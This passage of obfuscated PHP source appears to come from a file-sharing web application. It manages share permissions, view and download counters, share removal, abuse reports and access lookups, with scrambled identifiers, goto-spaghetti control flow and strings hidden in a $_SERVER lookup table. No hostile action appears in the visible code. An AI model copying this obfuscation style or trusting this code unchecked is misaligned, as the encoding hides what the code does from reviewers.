(!$Fù—ª¼°Ÿš) { return !1; } } if (!$eŒà…óì¥[$dÏ¦¼ºˆ¢¹[1432]]) { $eŒà…óì¥[$dÏ¦¼ºˆ¢¹[1432]] = $Fù—ª¼°Ÿš[$dÏ¦¼ºˆ¢¹[38]]; } goto b¼ó¯İ‚Ÿ; E•í¬á‹ºğ: } private function _shareAuthSet($eš°Å„î°, $f…ÓªãœŸ‹) { goto D­èô¤½”; dóÙÆĞ¶À“: return $f‹ò¡™Èô‡->addAll($C¥¢°Æáì˜, array(), !0); goto bÎœçªğ¤; a¯®˜ËçÅÆ: $f‹ò¡™Èô‡->where(array($d…ë£ØÄÃ[476] => $eš°Å„î°))->delete(); $C¥¢°Æáì˜ = array(); foreach ($f…ÓªãœŸ‹ as $bÔò‹ÒçÎµ) { $EöĞ¯Ü†¥í = SourceModel::TYPE_USER; if ($bÔò‹ÒçÎµ[$d…ë£ØÄÃ[412]] == SourceModel::TYPE_GROUP) { $EöĞ¯Ü†¥í = SourceModel::TYPE_GROUP; } $béï³ôã‹à = array($d…ë£ØÄÃ[476] => $eš°Å„î°, $d…ë£ØÄÃ[412] => $EöĞ¯Ü†¥í, $d…ë£ØÄÃ[492] => intval($bÔò‹ÒçÎµ[$d…ë£ØÄÃ[492]]), $d…ë£ØÄÃ[1785] => 0, $d…ë£ØÄÃ[1839] => -1); if ($bÔò‹ÒçÎµ[$d…ë£ØÄÃ[1785]]) { $béï³ôã‹à[$d…ë£ØÄÃ[1785]] = $bÔò‹ÒçÎµ[$d…ë£ØÄÃ[1785]]; } else { if ($bÔò‹ÒçÎµ[$d…ë£ØÄÃ[1839]]) { $béï³ôã‹à[$d…ë£ØÄÃ[1839]] = $bÔò‹ÒçÎµ[$d…ë£ØÄÃ[1839]]; } } $C¥¢°Æáì˜[] = $béï³ôã‹à; } goto dóÙÆĞ¶À“; D­èô¤½”: $d…ë£ØÄÃ =& $_SERVER[£¶ä½¶¢]; if (!is_array($f…ÓªãœŸ‹)) { return !1; } $f‹ò¡™Èô‡ = Model($d…ë£ØÄÃ[1789]); goto a¯®˜ËçÅÆ; bÎœçªğ¤: } public function numViewAdd($D«†¢®ƒª) { $BíÜñ•¬Ìâ =& $_SERVER[£¶ä½¶¢]; $fâ¡á›ˆ» = array($BíÜñ•¬Ìâ[475] => $D«†¢®ƒª); $this->where($fâ¡á›ˆ»)->setAdd($BíÜñ•¬Ìâ[1836]); } public function numDownloadAdd($CÆî™Œé§ô) { $eàæ‘¿½Æ =& $_SERVER[£¶ä½¶¢]; $f¯¿¢†”¾ = array($eàæ‘¿½Æ[475] => $CÆî™Œé§ô); $this->where($f¯¿¢†”¾)->setAdd($eàæ‘¿½Æ[1837]); } protected function shareEdit($B­óŞŸÆÀ›, $d¤ïÚ¹Ó‹) { goto A†ñˆĞ¡Ò®; aºÂ½ƒÌ: if (isset($d¤ïÚ¹Ó‹[$DùĞïÁ¤Øº[1829]])) { $this->_shareAuthSet($B­óŞŸÆÀ›, $d¤ïÚ¹Ó‹[$DùĞïÁ¤Øº[1829]]); } return !0; goto dêì©‡ÙŒ“; A†ñˆĞ¡Ò®: $DùĞïÁ¤Øº =& $_SERVER[£¶ä½¶¢]; $f†²ê®Åˆ² = $this->getInfo($B­óŞŸÆÀ›); if (!$f†²ê®Åˆ²) { return !1; } goto cÔÉÍò˜·; cÔÉÍò˜·: $this->_checkLinkShare($d¤ïÚ¹Ó‹, $f†²ê®Åˆ²); $EêÆ’êá²á = array(); $f×å¾Åì¥ = explode($DùĞïÁ¤Øº[57], $DùĞïÁ¤Øº[1840]); goto D¾Ú‰§‰±÷; D¾Ú‰§‰±÷: foreach ($f×å¾Åì¥ as $BªÖô‹äÄ) { if (!array_key_exists($BªÖô‹äÄ, $d¤ïÚ¹Ó‹)) { continue; } $EêÆ’êá²á[$BªÖô‹äÄ] = $d¤ïÚ¹Ó‹[$BªÖô‹äÄ]; } $this->shareEventAdd($f†²ê®Åˆ²[$DùĞïÁ¤Øº[403]], $d¤ïÚ¹Ó‹, $DùĞïÁ¤Øº[1657]); $this->where(array($DùĞïÁ¤Øº[475] => $B­óŞŸÆÀ›))->save($EêÆ’êá²á); goto aºÂ½ƒÌ; dêì©‡ÙŒ“: } private function _checkLinkShare($dµÇ”ˆÜÍ™, $a¯¿ëšÏÔŸ) { goto f£†ËôÓ; f£†ËôÓ: $D¿àáÔ”Â„ =& $_SERVER[£¶ä½¶¢]; if ($dµÇ”ˆÜÍ™[$D¿àáÔ”Â„[481]] != $D¿àáÔ”Â„[97]) { return; } $aÒ–«éèù = $a¯¿ëšÏÔŸ[$D¿àáÔ”Â„[95]][$D¿àáÔ”Â„[403]]; goto e£¾†Œ…; a‚îÙŒğĞ: $C‚‰—‰ƒÆ = $this->shareFileMeta($A‡‡©Ö„ˆÊ[$D¿àáÔ”Â„[455]]); if (isset($C‚‰—‰ƒÆ[$D¿àáÔ”Â„[381]]) && $C‚‰—‰ƒÆ[$D¿àáÔ”Â„[381]] == $D¿àáÔ”Â„[97]) { show_json(LNG($D¿àáÔ”Â„[1843]), !1); } goto FÖÊ”•âô; e£¾†Œ…: if ($a¯¿ëšÏÔŸ[$D¿àáÔ”Â„[95]][$D¿àáÔ”Â„[39]] != $D¿àáÔ”Â„[203]) { $E¬»Å‰í† = $this->_folderReport($aÒ–«éèù); if (!$E¬»Å‰í†) { return; } show_json(LNG($D¿àáÔ”Â„[1841]) . $D¿àáÔ”Â„[1842] . $E¬»Å‰í†, !1); } $A‡‡©Ö„ˆÊ = Model($D¿àáÔ”Â„[798])->fileInfoGet($a¯¿ëšÏÔŸ[$D¿àáÔ”Â„[95]][$D¿àáÔ”Â„[403]]); if (!$A‡‡©Ö„ˆÊ) { return; } goto a‚îÙŒğĞ; FÖÊ”•âô: } private function _folderReport($C³›º‘Ì‚©) { goto f‹ó¤îùÂã; f‹ó¤îùÂã: $EÇø½Ç›š =& $_SERVER[£¶ä½¶¢]; $c»¼Ò½õ‰ = array($EÇø½Ç›š[455] => array($EÇø½Ç›š[967], 0), $EÇø½Ç›š[718] => 3); $a“Ì¯Š×ğ² = Model($EÇø½Ç›š[1844])->where($c»¼Ò½õ‰)->field($EÇø½Ç›š[455])->select(); goto B¢ÛÜÜà‹; B¢ÛÜÜà‹: if (!$a“Ì¯Š×ğ²) { return !1; } $a“Ì¯Š×ğ² = array_to_keyvalue($a“Ì¯Š×ğ², $EÇø½Ç›š[43], $EÇø½Ç›š[455]); $F‹å¡ãàØß = $EÇø½Ç›š[57] . $C³›º‘Ì‚© . $EÇø½Ç›š[57]; goto Dİ–Ü¸éÕÜ; cÚŞ¨çŸæ: $E‰£÷ÅÌ¾Ë = substr($EÓÇ°­à[$EÇø½Ç›š[495]], strpos($EÓÇ°­à[$EÇø½Ç›š[495]], $F‹å¡ãàØß)); $c»¼Ò½õ‰ = array($EÇø½Ç›š[403] => array($EÇø½Ç›š[17], trim($E‰£÷ÅÌ¾Ë, $EÇø½Ç›š[57]))); $A©…ëá†äˆ = Model($EÇø½Ç›š[798])->where($c»¼Ò½õ‰)->field($EÇø½Ç›š[38])->select(); goto cÔŠÕ„·¬Û; cÔŠÕ„·¬Û: $C–¼»¡”ğ§ = array_to_keyvalue($A©…ëá†äˆ, $EÇø½Ç›š[43], $EÇø½Ç›š[38]); $C–¼»¡”ğ§[] = $EÓÇ°­à[$EÇø½Ç›š[38]]; return implode($EÇø½Ç›š[18], $C–¼»¡”ğ§); goto Eš±ç’Ì¹§; Dİ–Ü¸éÕÜ: $c»¼Ò½õ‰ = array($EÇø½Ç›š[455] => array($EÇø½Ç›š[17], $a“Ì¯Š×ğ²), $EÇø½Ç›š[495] => array($EÇø½Ç›š[388], "\45{$F‹å¡ãàØß}\x25"), $EÇø½Ç›š[431] => 0); $EÓÇ°­à = Model($EÇø½Ç›š[798])->where($c»¼Ò½õ‰)->field($EÇø½Ç›š[1845])->find(); if (!$EÓÇ°­à) { return !1; } goto cÚŞ¨çŸæ; Eš±ç’Ì¹§: } protected function remove($eñ” ÖÂñÍ) { goto Bôó×© ôÁ; dÚÈƒ¥·: for ($Bâ¶¥ƒ†Ò¶ = 0; $Bâ¶¥ƒ†Ò¶ < count($CÏ˜¨Šêïê); $Bâ¶¥ƒ†Ò¶++) { $CŒô«Ò˜¸ = $this->getInfo($CÏ˜¨Šêïê[$Bâ¶¥ƒ†Ò¶]); if ($CŒô«Ò˜¸[$E¼Úê¿•ƒ†[483]] == $E¼Úê¿•ƒ†[97]) { Model($E¼Úê¿•ƒ†[541])->eventShare($CŒô«Ò˜¸[$E¼Úê¿•ƒ†[403]], $E¼Úê¿•ƒ†[1834]); } if ($CŒô«Ò˜¸[$E¼Úê¿•ƒ†[481]] == $E¼Úê¿•ƒ†[97]) { Model($E¼Úê¿•ƒ†[541])->eventShare($CŒô«Ò˜¸[$E¼Úê¿•ƒ†[403]], $E¼Úê¿•ƒ†[1833]); } } return $a±À¸Š¤–Â; goto F¯¨ñ†¸„; Bôó×© ôÁ: $E¼Úê¿•ƒ† =& $_SERVER[£¶ä½¶¢]; if (is_array($eñ” ÖÂñÍ)) { $eñ” ÖÂñÍ = array($E¼Úê¿•ƒ†[17], $eñ” ÖÂñÍ); } $AìÏ°Ô…Õ = array($E¼Úê¿•ƒ†[476] => $eñ” ÖÂñÍ); goto aïÅëçñ¼; aïÅëçñ¼: $a±À¸Š¤–Â = $this->where($AìÏ°Ô…Õ)->delete(); if ($a±À¸Š¤–Â) { Model($E¼Úê¿•ƒ†[572])->where(array($E¼Úê¿•ƒ†[476] => $eñ” ÖÂñÍ))->delete(); } $CÏ˜¨Šêïê = is_array($eñ” ÖÂñÍ) ? $eñ” ÖÂñÍ[1] : array($eñ” ÖÂñÍ); goto dÚÈƒ¥·; F¯¨ñ†¸„: } protected function removeBySource($cµâ‘ø’ğÃ) { goto eÏ“¼»Âİ™; eÏ“¼»Âİ™: $eŠ” Î®Ê =& $_SERVER[£¶ä½¶¢]; $c˜ô‰…‹ŠÅ = array($eŠ” Î®Ê[418] => array($eŠ” Î®Ê[419], $cµâ‘ø’ğÃ)); $f¥æ«º„¥ò = $this->field($eŠ” Î®Ê[476])->where($c˜ô‰…‹ŠÅ)->select(); goto b¶ñğÀ™Ğ¡; b¶ñğÀ™Ğ¡: $f¥æ«º„¥ò = array_to_keyvalue($f¥æ«º„¥ò, $eŠ” Î®Ê[43], $eŠ” Î®Ê[476]); if (!$f¥æ«º„¥ò) { return; } $c˜ô‰…‹ŠÅ = array($eŠ” Î®Ê[475] => array($eŠ” Î®Ê[419], $f¥æ«º„¥ò)); goto AÀ»í÷æÃÙ; AÀ»í÷æÃÙ: $this->where($c˜ô‰…‹ŠÅ)->delete(); Model($eŠ” Î®Ê[572])->where($c˜ô‰…‹ŠÅ)->delete(); goto Bæ½¬ôÄšä; Bæ½¬ôÄšä: } public function listAll($C˜Â´Îø†‰) { goto Aƒ„ÉğŒŞ³; Aƒ„ÉğŒŞ³: $AÍ¿Æ‰ê§´ =& $_SERVER[£¶ä½¶¢]; $e³‚¯Êó¸ = array(); if ($C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[1526]]) { $e³‚¯Êó¸[$AÍ¿Æ‰ê§´[1526]] = $C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[1526]]; } goto C©Öå“„™; C©Öå“„™: if ($C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[729]]) { $eµ‰ó¢†‡Ä = $C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[484]] ? $C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[484]] : strtotime(date($AÍ¿Æ‰ê§´[1846])); $e³‚¯Êó¸[$AÍ¿Æ‰ê§´[204]] = array($AÍ¿Æ‰ê§´[340], array($C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[729]], $eµ‰ó¢†‡Ä)); } if ($C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[39]]) { $e³‚¯Êó¸[$C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[39]]] = 1; } else { $e³‚¯Êó¸[] = array($AÍ¿Æ‰ê§´[481] => array($AÍ¿Æ‰ê§´[967], 0), $AÍ¿Æ‰ê§´[483] => array($AÍ¿Æ‰ê§´[967], 0), $AÍ¿Æ‰ê§´[1823] => $AÍ¿Æ‰ê§´[1777]); } if ($C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[1773]]) { $e³‚¯Êó¸[] = array($AÍ¿Æ‰ê§´[478] => $C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[1773]], $AÍ¿Æ‰ê§´[1432] => array($AÍ¿Æ‰ê§´[388], "\45{$C˜Â´Îø†‰[$AÍ¿Æ‰ê§´[1773]]}\x25"), $AÍ¿Æ‰ê§´[1823] => $AÍ¿Æ‰ê§´[1777]); } goto FŠÄÆäŒ°Ø; bø¾ÆğÚö…: return $DÇ»¬³¯ˆÃ; goto E±ÏÓ§Éˆ¶; FŠÄÆäŒ°Ø: $DÇ»¬³¯ˆÃ = $this->_makeOrder()->where($e³‚¯Êó¸)->selectPage(20); if (empty($DÇ»¬³¯ˆÃ[$AÍ¿Æ‰ê§´[376]])) { return array(); } $this->_listDataApply($DÇ»¬³¯ˆÃ[$AÍ¿Æ‰ê§´[376]]); goto bø¾ÆğÚö…; E±ÏÓ§Éˆ¶: } public function listDataApply($aö‚ÅÌ°Ù) { $this->_listDataApply($aö‚ÅÌ°Ù); return $aö‚ÅÌ°Ù; } private function _listDataApply(&$eÂÓ÷‰§Æì) { goto a›“İçÉ‡Æ; fÇ‡·±…øŞ: unset($E¡Ûôò†Ÿ); $eÂÓ÷‰§Æì = array_values($eÂÓ÷‰§Æì); goto D©¹Ç³Ì…; a›“İçÉ‡Æ: $AÇÓÓÃøÎ¨ =& $_SERVER[£¶ä½¶¢]; $d­³ò§Íñ = array_to_keyvalue($eÂÓ÷‰§Æì, $AÇÓÓÃøÎ¨[43], $AÇÓÓÃøÎ¨[1526]); $CŸòÌÒÔœ² = Model($AÇÓÓÃøÎ¨[514])->userListInfo(array_unique($d­³ò§Íñ)); goto b‹øøå÷–›; b‹øøå÷–›: $B³ã«ÑµÙ— = array_to_keyvalue($eÂÓ÷‰§Æì, $AÇÓÓÃøÎ¨[43], $AÇÓÓÃøÎ¨[403]); $cô¥Ë½é–ï = Model($AÇÓÓÃøÎ¨[798])->sourceListInfo($B³ã«ÑµÙ—, !0); foreach ($eÂÓ÷‰§Æì as $bÉçŒµù™Ü => &$E¡Ûôò†Ÿ) { $D¥ÉÓÏ‚Ô = $E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[1526]]; $E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[1847]] = $CŸòÌÒÔœ²[$D¥ÉÓÏ‚Ô] ? $CŸòÌÒÔœ²[$D¥ÉÓÏ‚Ô] : !1; $eùß²–¡ø = $E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[403]]; $E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[95]] = $cô¥Ë½é–ï[$eùß²–¡ø] ? $cô¥Ë½é–ï[$eùß²–¡ø] : !1; if ($E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[95]][$AÇÓÓÃøÎ¨[431]] == $AÇÓÓÃøÎ¨[97]) { unset($eÂÓ÷‰§Æì[$bÉçŒµù™Ü]); } if ($E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[95]] != $AÇÓÓÃøÎ¨[201] && !$E¡Ûôò†Ÿ[$AÇÓÓÃøÎ¨[95]]) { unset($eÂÓ÷‰§Æì[$bÉçŒµù™Ü]); } } goto fÇ‡·±…øŞ; D©¹Ç³Ì…: } private function _makeOrder($a¾‹º¯”¬‡ = '') { goto D£×Ô—¨å‚; FÁ…Æ÷³„ğ: $a¾‹º¯”¬‡ = $a¾‹º¯”¬‡ . "{$A˜¹Õ‹˜»å}\40{$C¿Â÷†»í®}"; return $this->order($a¾‹º¯”¬‡); goto BĞ„†Ÿƒªğ; D£×Ô—¨å‚: $e¡’Ñ©ã•í =& $_SERVER[£¶ä½¶¢]; $b¿í°á£÷ = array($e¡’Ñ©ã•í[204], $e¡’Ñ©ã•í[484], $e¡’Ñ©ã•í[1836], $e¡’Ñ©ã•í[1837]); $d’ì·§Ø‰ = array($e¡’Ñ©ã•í[436] => $e¡’Ñ©ã•í[437], $e¡’Ñ©ã•í[438] => $e¡’Ñ©ã•í[439]); goto bË±°¢Îƒ–; bË±°¢Îƒ–: $A˜¹Õ‹˜»å = Input::get($e¡’Ñ©ã•í[443], $e¡’Ñ©ã•í[17], $e¡’Ñ©ã•í[424], $b¿í°á£÷); $C¿Â÷†»í® = Input::get($e¡’Ñ©ã•í[444], $e¡’Ñ©ã•í[17], $e¡’Ñ©ã•í[1848], array($e¡’Ñ©ã•í[1772], $e¡’Ñ©ã•í[438])); $C¿Â÷†»í® = $d’ì·§Ø‰[$C¿Â÷†»í®]; goto FÁ…Æ÷³„ğ; BĞ„†Ÿƒªğ: } public function reportAdd($B²Ï¯ª„) { $E…ä÷¾˜Ç =& $_SERVER[£¶ä½¶¢]; $D»Ù‹›³ğ¾ = array($E…ä÷¾˜Ç[476] => $B²Ï¯ª„[$E…ä÷¾˜Ç[476]], $E…ä÷¾˜Ç[1526] => USER_ID); if (Model($E…ä÷¾˜Ç[1844])->where($D»Ù‹›³ğ¾)->find()) { return !1; } $EºÔõÇç–° = array($E…ä÷¾˜Ç[476] => $B²Ï¯ª„[$E…ä÷¾˜Ç[476]], $E…ä÷¾˜Ç[1432] => $B²Ï¯ª„[$E…ä÷¾˜Ç[1432]], $E…ä÷¾˜Ç[403] => $B²Ï¯ª„[$E…ä÷¾˜Ç[403]], $E…ä÷¾˜Ç[455] => $B²Ï¯ª„[$E…ä÷¾˜Ç[455]], $E…ä÷¾˜Ç[1526] => USER_ID, $E…ä÷¾˜Ç[39] => $B²Ï¯ª„[$E…ä÷¾˜Ç[39]], $E…ä÷¾˜Ç[439] => $B²Ï¯ª„[$E…ä÷¾˜Ç[439]]); return Model($E…ä÷¾˜Ç[1844])->add($EºÔõÇç–°); } public function reportList($f–šˆš¾ÀÇ) { goto cÄ•®ø×å; A¥áëøµ÷Ù: $E°ñ¼÷÷ = array($FÈˆÂŠ¢Õ[436] => $FÈˆÂŠ¢Õ[437], $FÈˆÂŠ¢Õ[438] => $FÈˆÂŠ¢Õ[439]); $eÅÆ˜£³³æ = $FÈˆÂŠ¢Õ[1853] . $E°ñ¼÷÷[$bÇÄ™½‘]; $aÇÙ×÷‚ƒ• = Model($FÈˆÂŠ¢Õ[1844])->where($EÙèŠìÁâ²)->order($eÅÆ˜£³³æ)->selectPage(20); goto d²†ù‡šİÎ; cÄ•®ø×å: $FÈˆÂŠ¢Õ =& $_SERVER[£¶ä½¶¢]; $EÙèŠìÁâ² = array(); if ($f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[729]]) { $EÔÓøŠˆ® = $f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[484]] ? $f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[484]] : strtotime(date($FÈˆÂŠ¢Õ[1846])); $EÙèŠìÁâ²[$FÈˆÂŠ¢Õ[204]] = array($FÈˆÂŠ¢Õ[340], array($f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[729]], $EÔÓøŠˆ®)); } goto e÷¾†Î…; d²†ù‡šİÎ: if (empty($aÇÙ×÷‚ƒ•[$FÈˆÂŠ¢Õ[376]])) { return array(); } $Fª—äí×Ç = array_to_keyvalue_group($aÇÙ×÷‚ƒ•[$FÈˆÂŠ¢Õ[376]], $FÈˆÂŠ¢Õ[718], $FÈˆÂŠ¢Õ[476]); if (!empty($Fª—äí×Ç[0])) { $f–šˆš¾ÀÇ = $Fª—äí×Ç[0]; $EÙèŠìÁâ² = array($FÈˆÂŠ¢Õ[476] => array($FÈˆÂŠ¢Õ[17], $f–šˆš¾ÀÇ)); $b‹Ÿ“´Ùù = $this->where($EÙèŠìÁâ²)->field($FÈˆÂŠ¢Õ[476])->select(); $b‹Ÿ“´Ùù = array_to_keyvalue($b‹Ÿ“´Ùù, $FÈˆÂŠ¢Õ[43], $FÈˆÂŠ¢Õ[476]); $EÕçŠğ§”³ = array_diff($f–šˆš¾ÀÇ, $b‹Ÿ“´Ùù); if (!empty($EÕçŠğ§”³)) { foreach ($aÇÙ×÷‚ƒ•[$FÈˆÂŠ¢Õ[376]] as $eëÛ ÂŠ™¥ => $DÍ¥Î´ùŠ“) { if (in_array($DÍ¥Î´ùŠ“[$FÈˆÂŠ¢Õ[476]], $EÕçŠğ§”³)) { unset($aÇÙ×÷‚ƒ•[$FÈˆÂŠ¢Õ[376]][$eëÛ ÂŠ™¥]); } } } } goto bß°ÕÌÏù—; bß°ÕÌÏù—: $this->_listDataApply($aÇÙ×÷‚ƒ•[$FÈˆÂŠ¢Õ[376]]); return $aÇÙ×÷‚ƒ•; goto bÔ‚ô£²ã ; e÷¾†Î…: if (isset($f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[39]]) && in_array($f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[39]], array($FÈˆÂŠ¢Õ[97], $FÈˆÂŠ¢Õ[1849], $FÈˆÂŠ¢Õ[1850], $FÈˆÂŠ¢Õ[1851], $FÈˆÂŠ¢Õ[1852]))) { $EÙèŠìÁâ²[$FÈˆÂŠ¢Õ[39]] = $f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[39]]; } if (isset($f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[718]]) && in_array($f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[718]], array($FÈˆÂŠ¢Õ[201], $FÈˆÂŠ¢Õ[97], $FÈˆÂŠ¢Õ[1849], $FÈˆÂŠ¢Õ[1850]))) { $EÙèŠìÁâ²[$FÈˆÂŠ¢Õ[718]] = $f–šˆš¾ÀÇ[$FÈˆÂŠ¢Õ[718]]; } $bÇÄ™½‘ = Input::get($FÈˆÂŠ¢Õ[444], $FÈˆÂŠ¢Õ[17], $FÈˆÂŠ¢Õ[1848], array($FÈˆÂŠ¢Õ[1772], $FÈˆÂŠ¢Õ[438])); goto A¥áëøµ÷Ù; bÔ‚ô£²ã : } public function reportStatus($d–Ù‘¡’…Ì) { goto EÚ¤µ£Š›­; c¿¬åÆÔƒğ: return $bâÖÚÌ˜Ô; goto b ¤Ø£×¬; bÊµ‡…•º: if (!$CÎÌÁÚŒÕ²) { return !1; } $c¶øÙÁ—„± = array($Aã¼ŒºÉÜ[718] => $d–Ù‘¡’…Ì[$Aã¼ŒºÉÜ[718]]); if ($d–Ù‘¡’…Ì[$Aã¼ŒºÉÜ[718]] == $Aã¼ŒºÉÜ[1850] && $CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[718]] == $Aã¼ŒºÉÜ[1850]) { $c¶øÙÁ—„±[$Aã¼ŒºÉÜ[718]] = 0; } goto E…‹¦Èë¿˜; E…‹¦Èë¿˜: $bâÖÚÌ˜Ô = Model($Aã¼ŒºÉÜ[1844])->where($dáåˆœÂ³)->save($c¶øÙÁ—„±); if ($d–Ù‘¡’…Ì[$Aã¼ŒºÉÜ[718]] == $Aã¼ŒºÉÜ[1849]) { if ($CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[455]] != $Aã¼ŒºÉÜ[201] && $this->shareFileMeta($CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[455]])) { $this->shareFileMeta($CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[455]], 0); } $this->remove($CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[476]]); return !0; } if ($bâÖÚÌ˜Ô && $d–Ù‘¡’…Ì[$Aã¼ŒºÉÜ[718]] == $Aã¼ŒºÉÜ[1850]) { $E±Ù¬“»Å = $c¶øÙÁ—„±[$Aã¼ŒºÉÜ[718]] == $Aã¼ŒºÉÜ[1850] ? 1 : 0; $this->shareFileMeta($CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[455]], $E±Ù¬“»Å); $this->removeByFile($CÎÌÁÚŒÕ²[$Aã¼ŒºÉÜ[455]]); } goto c¿¬åÆÔƒğ; EÚ¤µ£Š›­: $Aã¼ŒºÉÜ =& $_SERVER[£¶ä½¶¢]; $dáåˆœÂ³ = array($Aã¼ŒºÉÜ[401] => $d–Ù‘¡’…Ì[$Aã¼ŒºÉÜ[401]]); $CÎÌÁÚŒÕ² = Model($Aã¼ŒºÉÜ[1844])->where($dáåˆœÂ³)->field($Aã¼ŒºÉÜ[1854])->find(); goto bÊµ‡…•º; b ¤Ø£×¬: } private function removeByFile($A›¡õ®È’) { goto A ó¿â­ƒµ; eÅêêµİé: $A²è§¯ò„’ = array_to_keyvalue($EŸÌõÆ˜¹, $cİ¼¾í•Ÿ[43], $cİ¼¾í•Ÿ[476]); $this->remove($A²è§¯ò„’); goto BÄ‘ŠÊŠ±; e¦âæ’«Î¤: $d¹ò«»àä¼ = array($cİ¼¾í•Ÿ[403] => array($cİ¼¾í•Ÿ[17], $f©ƒ¨¨éà), $cİ¼¾í•Ÿ[481] => 1); $EŸÌõÆ˜¹ = $this->where($d¹ò«»àä¼)->field($cİ¼¾í•Ÿ[476])->select(); if (empty($EŸÌõÆ˜¹)) { return; } goto eÅêêµİé; A ó¿â­ƒµ: $cİ¼¾í•Ÿ =& $_SERVER[£¶ä½¶¢]; $EŸÌõÆ˜¹ = Model($cİ¼¾í•Ÿ[798])->where(array($cİ¼¾í•Ÿ[455] => $A›¡õ®È’))->field($cİ¼¾í•Ÿ[403])->select(); $f©ƒ¨¨éà = array_to_keyvalue($EŸÌõÆ˜¹, $cİ¼¾í•Ÿ[43], $cİ¼¾í•Ÿ[403]); goto e¦âæ’«Î¤; BÄ‘ŠÊŠ±: } private function shareFileMeta($F¾²¬éŒ, $BÛŞŠ‘Ì­× = null) { $b®…Õ§šĞƒ =& $_SERVER[£¶ä½¶¢]; $eëò«ªĞ„ = array($b®…Õ§šĞƒ[455] => $F¾²¬éŒ, $b®…Õ§šĞƒ[103] => $b®…Õ§šĞƒ[1855]); if (is_null($BÛŞŠ‘Ì­×)) { return Model($b®…Õ§šĞƒ[1856])->where($eëò«ªĞ„)->find(); } $eëò«ªĞ„[$b®…Õ§šĞƒ[381]] = $BÛŞŠ‘Ì­×; Model($b®…Õ§šĞƒ[1856])->add($eëò«ªĞ„, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\x63\x65\137\x61\165\x74\150"; public function getAuth($aÃÇêµ™îÈ) { goto Eñã«ùÀÀö; Eñã«ùÀÀö: $F®º°…Ü…¾ =& $_SERVER[£¶ä½¶¢]; $bî•ğìŞŠÈ = $this->sourceAuthSelect($aÃÇêµ™îÈ); $c”¯—ãêâ® = array(); goto EŒàÆÓ³Î; D¯Ê¦ƒô¦º: array_multisort($aÜŞÁ°´â, SORT_DESC, $c”¯—ãêâ®); return $c”¯—ãêâ®; goto Eì¤Òòöƒİ; EŒàÆÓ³Î: $aÜŞÁ°´â = array(); $B»õİ‚»ìÕ = 2 << 25; foreach ($bî•ğìŞŠÈ as $dä°ğÕ—¾) { goto e÷À¦ğ¾; f¿±‘ÌÑê¢: $eÅğ¸äÊ•Ñ = 0; if ($dä°ğÕ—¾[$F®º°…Ü…¾[412]] == SourceModel::TYPE_GROUP) { $eÅğ¸äÊ•Ñ = $B»õİ‚»ìÕ * 2; } if ($dä°ğÕ—¾[$F®º°…Ü…¾[412]] == SourceModel::TYPE_USER) { $eÅğ¸äÊ•Ñ = $B»õİ‚»ìÕ; } goto AÎ‘Ò ¬Œµ; AÎ‘Ò ¬Œµ: if ($dä°ğÕ—¾[$F®º°…Ü…¾[412]] == SourceModel::TYPE_USER && $dä°ğÕ—¾[$F®º°…Ü…¾[492]] == $F®º°…Ü…¾[201]) { $eÅğ¸äÊ•Ñ = 0; } $aÜŞÁ°´â[] = $EÏ¬–‰¦Ò[$F®º°…Ü…¾[414]] + $eÅğ¸äÊ•Ñ; goto Aõ„¾ç¤ÓÑ; e÷À¦ğ¾: $EÏ¬–‰¦Ò = Model($F®º°…Ü…¾[1857])->listData($dä°ğÕ—¾[$F®º°…Ü…¾[1785]]); if (!$EÏ¬–‰¦Ò) { continue; } $c”¯—ãêâ®[] = $dä°ğÕ—¾; goto f¿±‘ÌÑê¢; Aõ„¾ç¤ÓÑ: } goto D¯Ê¦ƒô¦º; Eì¤Òòöƒİ: } public function sourceAuthSelect($D•éáÛ©) { goto B˜º§‹¥ ¡; B˜º§‹¥ ¡: $cİñ…”ä±Ë =& $_SERVER[£¶ä½¶¢]; static $cèÙë®‘½¹ = array(); $däÃˆ„”ÍÛ = is_array($D•éáÛ©) ? !1 : !0; goto cÎÙÉ·ˆ; EƒÃ’ãª©Œ: if ($däÃˆ„”ÍÛ) { return $B×”Ö˜Á; } return $A–”‰×«¶•; goto d¯ÄóÑÊ¡±; cÎÙÉ·ˆ: if ($däÃˆ„”ÍÛ) { $D•éáÛ© = array($D•éáÛ©); } $Bö³Á¢Ë†¦ = array(); foreach ($D•éáÛ© as $B„À³Ì—Œ‹) { if (isset($cèÙë®‘½¹[$B„À³Ì—Œ‹])) { $Bö³Á¢Ë†¦[$B„À³Ì—Œ‹] = $cèÙë®‘½¹[$B„À³Ì—Œ‹]; } } goto cîÃÀì›îÏ; bôÁ¦Úîá‡: $B×”Ö˜Á = $this->field($cÙ„èáí)->order($cİñ…”ä±Ë[401])->where($aº–ùµ–Ò)->select(); $A–”‰×«¶• = array_to_keyvalue_group($B×”Ö˜Á, $cİñ…”ä±Ë[403]); foreach ($D•éáÛ© as $B„À³Ì—Œ‹) { 